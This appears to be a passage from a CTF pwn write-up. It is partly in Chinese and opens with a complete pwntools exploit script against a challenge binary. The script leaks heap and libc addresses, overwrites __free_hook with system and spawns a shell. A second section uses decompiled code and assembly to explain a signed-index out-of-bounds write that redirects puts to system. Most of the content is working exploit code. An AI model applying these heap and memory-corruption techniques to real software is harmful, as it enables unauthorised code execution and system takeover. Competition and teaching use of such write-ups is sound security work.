
```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp', '64']

def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s = lambda data               :p.send(str(data))
sa = lambda text,data          :p.sendafter(text, str(data))
sl = lambda data               :p.sendline(str(data))
sla = lambda text,data          :p.sendlineafter(text, str(data))
r = lambda num=4096           :p.recv(num)
ru = lambda text               :p.recvuntil(text)
ia = lambda                    :p.interactive()
hs256 = lambda data               :sha256(str(data).encode()).hexdigest()
l32 = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64 = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32 = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64 = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16 = lambda data               :int(data,16)
lg = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(con):
    sla(">",1)
    p.sendafter("input some",con)

def edit(idx,con):
    sla(">",2)
    sla("idx:",idx)
    sla("Would you like to make final edits?",1)
    p.sendafter("input your content",con)

def show(idx):
    sla(">",2)
    sla("idx:",idx)
    sla("Would you like to make final edits?",2)

# x/32gx $rebase(0x4088)

buf = 0x4060
ptr = 0x4088

sla("Let us get to know each other.",'e4l4')

add('a')# 0
add('a')# 1
add('a')# 2
show(2)
show(0)
show(1)
add('a')# 3
add('a')# 4

sla(">",3)
sla("idx:",3)
sa("do you want crazy",'f\n')
sa("Go ahead and doodle for your artistic inspiration.",'a')

show(3)
ru("Please enjoy your masterpiece.\n")
heap_base = uu64()
lg("heap_base")

sla(">",3)
sa("do you want crazy",'f\n')
sa("Go ahead and doodle for your artistic inspiration.",p64(heap_base-0x261+0x10))

add('a')# 5
add('\x00'*0xe+'\x07\x00')# 6

show(5)
show(4)

edit(6,'\x00'*0x10)

add('a')# 7
show(7)
libc_base = l64()-0x1ecc61
lg('libc_base')
free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base +libc.sym["system"]

add('a')# 8
add('a')# 9

show(8)
show(9)
sla(">",3)
sa("do you want crazy",'f\n')
sa("Go ahead and doodle for your artistic inspiration.",p64(free_hook))

add('/bin/sh\x00')# 10
add(p64(system))
# dbg()
show(10)

ia()
```

## over

题目看上去存在一个很复杂的算法，观察发现其3个功能都是对`*(&ptr + num + 12)`这个位置的值进行加减异或，而`num`却为`int`类型。

```c
__int64 *sub_156C()
{
  int v0; // ecx
  __int64 *result; // rax
  int i; // [rsp+4h] [rbp-4Ch]
  int v3; // [rsp+8h] [rbp-48h]
  int v4; // [rsp+1Ch] [rbp-34h]
  int v5[10]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  show("what do you want to choose\n");
  v3 = read_num();
  if ( v3 > 4 )
    exit(0);
  v4 = (0x35DA * v3 - 0x4B2D) ^ 0xC925;
  for ( i = 0; i <= 9; ++i )
  {
    v5[i] = (0x35DA * v3) ^ v3 ^ (0x35DA * v3) ^ 42641;
    v5[i] += v4;
  }
  ptr += v4;
  show("some add\n");
  v0 = *(&ptr + v3 + 12) + read_num();
  result = &ptr;
  *(&ptr + v3 + 12) = v0;
  return result;
}
```

题目开始将`puts`的真实地址放在了`puts_addr`变量上。由于有效的输出函数无法泄露`libc`，这里可以控制`num`来修改`puts_addr`为`system`函数的真实地址，也就是`puts`函数的真实地址 + 相对偏移 = `system`函数的真实地址，再调用4功能即可实现`getshell`。`num`的计算可以参考汇编，`0x28 / 4 - 0xc = -2`。

```text
// *(&ptr + v3 + 12) = v0;
.text:0000000000001688 48 83 C0 0C                   add     rax, 0Ch
.text:000000000000168C 48 8D 14 85 00 00 00 00       lea     rdx, ds:0[rax*4]
.text:0000000000001694 48 8D 05 C5 29 00 00          lea     rax, ptr
.text:000000000000169B 89 0C 02                      mov     [rdx+rax], ecx
.text:000000000000169E 90                            nop
```
